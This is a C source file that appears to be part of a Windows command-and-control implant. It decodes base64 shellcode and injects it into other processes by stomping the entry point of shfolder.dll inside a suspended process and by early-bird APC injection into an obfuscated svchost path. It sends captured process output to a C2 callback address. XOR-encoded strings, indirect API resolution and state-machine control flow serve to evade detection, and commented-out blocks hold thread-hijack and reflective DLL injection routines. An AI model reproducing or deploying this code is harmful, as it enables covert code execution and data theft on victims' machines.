#include "main.h"
//#include "ReflectiveLoader.h"

#define IDLE_KILL_TIME 60
//find a process that is suitable to inject into
static DWORD FindTarget(const char *procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    DWORD pid = 0, state=2;
    
    while(state != 5){
    	switch(state){
    	case 0:
    		pe32.dwSize = sizeof (PROCESSENTRY32);            
   			if (!API(KERNEL32,Process32First)(hProcSnap, &pe32)) {
        		API(KERNEL32,CloseHandle)(hProcSnap);
        		return 0;
    		}
    		state = 1;
    		break;
    	case 1:
    		while (API(KERNEL32,Process32Next)(hProcSnap, &pe32)) {
    			if (!mystrcmp(procname, pe32.szExeFile)) {
    			    pid = pe32.th32ProcessID;
    			    break;
    			}
			} 
			state = 5;  
    		break;
    	case 2:
    		hProcSnap = API(KERNEL32,CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
    		if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
    		state = 0;
    		break;
    	default:
    		break;
    	}
    }       
    API(KERNEL32,CloseHandle)(hProcSnap);       
    return pid;
}/*
//find a process that is suitable to inject into
DWORD FindTarget(const char* process){
	DWORD PID = 0;
	HANDLE hProcess = NULL;
	DWORD dwProcCount = 0;
	WTS_PROCESS_INFO* pWPIs = NULL;

	if(!API(WTSAPI32, WTSEnumerateProcessesA)(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &pWPIs, &dwProcCount)){
		return -1;
	}
	for(DWORD i=0; i<dwProcCount; i++){
		hProcess = API(KERNEL32,OpenProcess)(PROCESS_ALL_ACCESS, FALSE, pWPIs[i].ProcessId);
	
		if (hProcess){
			if((API(KERNEL32,GetCurrentProcessId)() != pWPIs[i].ProcessId) && (pWPIs[i].ProcessId != 0)){
				PID = pWPIs[i].ProcessId;
				API(WTSAPI32,WTSFreeMemory)(pWPIs);
				pWPIs = NULL;
				return PID;
			}
		}
	}
	return -1;
}*/
/*
HANDLE GetThread(DWORD pid){
	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;
	thEntry.dwSize = sizeof(thEntry);

	HANDLE hSnapshot = API(KERNEL32,CreateToolhelp32Snapshot)(TH32CS_SNAPTHREAD, 0);
	while (API(KERNEL32,Thread32Next)(hSnapshot, &thEntry)){
		if (thEntry.th32OwnerProcessID == pid){
			hThread = API(KERNEL32,OpenThread)(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	API(KERNEL32,CloseHandle)(hSnapshot);
	return hThread;
}

BOOL InjectCode(char* Bytes, size_t Size){
	/*
       Inject code into a given process, this will stop the process
       from continuing its execution flow by forcing rip to point to the
       start of our code. use with caution, likely to crash the remote process
    *//*
	HANDLE hThread, hProcess;
	LPVOID pBuffer = NULL;
	CONTEXT ctx;
	DWORD pid = NULL;

	//find a thread in target process
	pid = FindTarget(NULL);
	if (pid){
		hThread = GetThread(pid);
		hProcess = API(KERNEL32,OpenProcess)(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
											PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
		pBuffer = API(KERNEL32,VirtualAllocEx)(hProcess,NULL,Size,  (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);
		API(KERNEL32,WriteProcessMemory)(hProcess, pBuffer, Bytes, Size, NULL);
		API(KERNEL32,SuspendThread)(hThread);

		//get current context of the thread
		ctx.ContextFlags = CONTEXT_FULL;
		API(KERNEL32,GetThreadContext)(hThread, &ctx);
		ctx.Eip = (DWORD_PTR)pBuffer;
		API(KERNEL32,SetThreadContext)(hThread,&ctx);
		API(KERNEL32,ResumeThread)(hThread);
		return TRUE;
	}
	return FALSE;
}*/


// Inject code in other process by loading a benign dll and then patching entry point with shellcode
static BOOL InjectCode(char* Bytes,size_t Size){
	CHAR rModuleName[128];
	HANDLE hProcess, dllThread;
	HMODULE rModule = NULL, hModules[256];
	CHAR ModuleName[] = "C:\\windows\\system32\\shfolder.dll";
	char cmdPath[] = "\x06\x76\x18\x04\x21\x27\x33\x26\x39\x30\x13\x30\x38\x29\x31\x2b\x39\x61\x73\x1d\x30\x37\x21\x7c\x35\x3e\x2c";
	DWORD moduleNameSize = 0, PID = 0, hModulesSizeNeeded = 0;
	LPVOID lprBuffer = NULL, dllEntryPoint = NULL, peHeader = NULL;
	SIZE_T hModulesCount = 0, hModulesSize = sizeof hModules;

	STARTUPINFO sInfo;
    PROCESS_INFORMATION pInfo;

	// inject a benign DLL into remote process
	memoryset(hModules, 0, sizeof hModules);
	memoryset(rModuleName, 0, sizeof rModuleName);
    memoryset(&sInfo, 0, sizeof sInfo);
    memoryset(&pInfo, 0, sizeof (PROCESS_INFORMATION));

    //change the std values to our pipes
    sInfo.cb = sizeof (STARTUPINFO);
    sInfo.wShowWindow = 0;
    sInfo.dwFlags = STARTF_USESTDHANDLES;

    //API(KERNEL32,CreateProcessA)("C:\\Windows\\system32\\WerFault.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo);
    XOR(cmdPath, (sizeof cmdPath)-1, xorkey2);
    API(KERNEL32, CreateProcessA)(cmdPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &sInfo, &pInfo);
    XOR(cmdPath, (sizeof cmdPath)-1, xorkey2);
    hProcess = pInfo.hProcess;

	if (!hProcess){
		return FALSE;
	}
	lprBuffer = API(KERNEL32, VirtualAllocEx)(hProcess, NULL, sizeof ModuleName, MEM_COMMIT, PAGE_READWRITE);
	API(KERNEL32, WriteProcessMemory)(hProcess, lprBuffer, (LPVOID) ModuleName, sizeof ModuleName, NULL);
	XOR(C_LoadLibraryA, (sizeof C_LoadLibraryA) -1, xorkey2);	

	PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE) get_proc_address(GetKernel32(), C_LoadLibraryA);
	dllThread = API(KERNEL32, CreateRemoteThread)(hProcess, NULL, 0, threadRoutine, lprBuffer, 0, NULL);
	XOR(C_LoadLibraryA, (sizeof C_LoadLibraryA) -1, xorkey2);
	API(KERNEL32, WaitForSingleObject)(dllThread, 1000);

	// find base address of the injected benign DLL in remote process
	API(PSAPI, EnumProcessModules)(hProcess, hModules, hModulesSize, &hModulesSizeNeeded);
	hModulesCount = hModulesSizeNeeded / sizeof (HMODULE);
		
	for (size_t i = 0; i < hModulesCount; i++){
		rModule = hModules[i];
		
		API(PSAPI, GetModuleBaseNameA)(hProcess, rModule, rModuleName, sizeof rModuleName);
		if (!mystrcmp(rModuleName, "shfolder.dll")){
			break;
		}
	}

    // get DLL's AddressOfEntryPoint
	DWORD headerBufferSize = 0x1000;
	peHeader = hAlloc(headerBufferSize);
	API(KERNEL32, ReadProcessMemory)(hProcess, rModule, peHeader, headerBufferSize, NULL);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER) peHeader;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS) ((DWORD_PTR) peHeader + dosHeader->e_lfanew);
	dllEntryPoint = (LPVOID) (ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR) rModule);

	// write shellcode to DLL's AddressofEntryPoint
	API(KERNEL32,Sleep)(9000);
	API(KERNEL32, WriteProcessMemory)(hProcess, dllEntryPoint, (LPCVOID) Bytes, Size, NULL);
	memoryset(Bytes, 0, Size);
	hFree(Bytes);

	// execute shellcode from inside the benign DLL
	API(KERNEL32, CreateRemoteThread)(hProcess, NULL, 0, (PTHREAD_START_ROUTINE) dllEntryPoint, NULL, 0, NULL);
	return TRUE;
}

static VOID WINAPI ReadFromPipe(HANDLE hChildStd_OUT_Rd){
	char chBuf[1001];
	DWORD dwread, rOpCode;
	BOOL bSuccess = FALSE;

	do{
		bSuccess = API(KERNEL32, ReadFile)(hChildStd_OUT_Rd, chBuf, 1001, &dwread, NULL);
		BeaconCallbackC2(_C2_CALLBACK_ADDRESS, 0, _CALLBACK_URL, DO_CALLBACK, chBuf, dwread);
		memoryset(chBuf, 0, sizeof chBuf);

	}while(TRUE);

	return;
}

static BOOL SpawnUserCode(char* Bytes,size_t Size){
	/*
    Run user supplied code and send all the output back to them
    */
    char svchost[] = "\x06\x76\x18\x04\x21\x27\x33\x26\x39\x30\x13\x30\x38\x29\x31\x2b\x39\x61\x73\x1d\x20\x2c\x26\x3a\x3f\x35\x3d\x6b\x29\x3c\x36";
    DWORD threadId, state = 0;
    LPVOID pBuffer;
    STARTUPINFOEXA sInfo;
    PROCESS_INFORMATION pInfo;
    SECURITY_ATTRIBUTES saAttr;

	HANDLE hChildStd_IN_Rd = NULL;
	HANDLE hChildStd_IN_Wr = NULL;
	HANDLE hChildStd_OUT_Rd = NULL;
	HANDLE hChildStd_OUT_Wr = NULL;

    saAttr.nLength = sizeof (SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    //create pipe to get the stdout
    API(KERNEL32, CreatePipe)(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0);
    API(KERNEL32, SetHandleInformation)(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);

    //create a pipe for the child process stdin
    API(KERNEL32, CreatePipe)(&hChildStd_IN_Rd, &hChildStd_IN_Wr, &saAttr, 0);
    API(KERNEL32, SetHandleInformation)(hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);

    memoryset(&sInfo, 0, sizeof sInfo);
    memoryset(&pInfo, 0, sizeof (PROCESS_INFORMATION));

    //change the std values to our pipes
    sInfo.StartupInfo.cb = sizeof (STARTUPINFOEXA);
    sInfo.StartupInfo.hStdError = hChildStd_OUT_Wr;
    sInfo.StartupInfo.hStdOutput = hChildStd_OUT_Wr;
    sInfo.StartupInfo.hStdInput = hChildStd_IN_Rd;
    sInfo.StartupInfo.dwFlags = STARTF_USESTDHANDLES | EXTENDED_STARTUPINFO_PRESENT;

    while (state != 4){
    	switch(state){
    	case 0:
    		API(KERNEL32, CreateThread)(NULL, 0, ReadFromPipe, hChildStd_OUT_Rd, 0, &threadId);
    		API(KERNEL32,Sleep)(5000);


    		XOR(svchost, (sizeof svchost)-1, xorkey2);
    		API(KERNEL32, CreateProcessA)(svchost, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);
    		XOR(svchost, (sizeof svchost)-1, xorkey2);
    		state = 2;
    		break;
    	case 1:
    		memoryset(Bytes, 0, Size);
    		hFree(Bytes);
    		state = 3;
    		break;
    	case 2:
    		pBuffer = (LPVOID) API(KERNEL32, VirtualAllocEx)(pInfo.hProcess, NULL, Size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READ);
    		API(KERNEL32, WriteProcessMemory)(pInfo.hProcess, pBuffer, Bytes, Size, NULL);
    		state = 1;
    		break;
    	case 3:
    		API(KERNEL32, QueueUserAPC)((PAPCFUNC) pBuffer, pInfo.hThread, NULL);
    		API(KERNEL32, ResumeThread)(pInfo.hThread);
    		API(KERNEL32, CloseHandle)(pInfo.hThread);
    		state = 4;
    		break;
    	default:
    		break;
    	}
    }
    return TRUE;
}

BOOL ExecuteMemory(char* Bytes, size_t Size, BOOL Module){
	do{
		switch(Module){
		case TRUE:
			SpawnUserCode(Bytes, Size);
			break;
		case FALSE:
			InjectCode(Bytes, Size);
			break;
		default:
			break;
		}
		break;

	}while(1);
	return TRUE;
}

BOOL ExecuteCode(char* Base64Buffer, BOOL CodeType){
	char* b64_out;
	size_t out_len = mystrlen(Base64Buffer) +1;
	size_t b64_len = b64_decoded_size(Base64Buffer);

	b64_out = base64_decode(Base64Buffer, out_len-1, &out_len);

	//calling Executememory
	switch(CodeType){
	case TRUE:
		return ExecuteMemory(b64_out, b64_len, TRUE);
	case FALSE:
		return ExecuteMemory(b64_out, b64_len, FALSE);
	default:
		return FALSE;
	}
}

/*
static BOOL InjectDLL(char* Bytes, size_t Size, char* procName){
	DWORD PID, state = 0;
	LPVOID rBuffer;
	DWORD offset, threadId;
	HANDLE hProcess, hThread;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;

	while (state != 6){
		switch (state){
		case 0:
			state = 3;
			break;
		case 2:
			PID = FindTarget(procName);
			hProcess = API(KERNEL32, OpenProcess)(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, PID);
			if (!hProcess){
				return FALSE;
			}
			state = 4;
			break;
		case 3:
			offset = GetReflectiveLoaderOffset(Bytes);
			if (!offset){
				return FALSE;
			}
			state = 2;
			break;
		case 4:
			rBuffer = API(KERNEL32, VirtualAllocEx)(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
			API(KERNEL32, WriteProcessMemory)(hProcess, rBuffer, Bytes, Size, NULL);
			memoryset(Bytes, 0, Size);
			hFree(Bytes);
			hFree(procName);
			state = 5;
			break;
		case 5:
			lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR) rBuffer+offset);
			hThread = API(KERNEL32, CreateRemoteThread)(hProcess, NULL, 1024*1024, lpReflectiveLoader, NULL, (DWORD) NULL, &threadId);
			API(KERNEL32, CloseHandle)(hProcess);
			state = 6;
			break;
		default:
			break;
		}
	}
	return TRUE;
}

BOOL ExecuteDLL(char* Base64Buffer){
	size_t out_len, b64_len;
	char* b64_out, *procName, *Bytes;

	procName = split(Base64Buffer);
	Bytes = mystrstr(Base64Buffer, "|") +1;
	out_len = mystrlen(Bytes);
	b64_len = b64_decoded_size(Bytes);
	b64_out = base64_decode(Bytes, out_len, &out_len);

	if (!b64_out){
		return FALSE;
	}
	return InjectDLL(b64_out, b64_len, procName);
}*/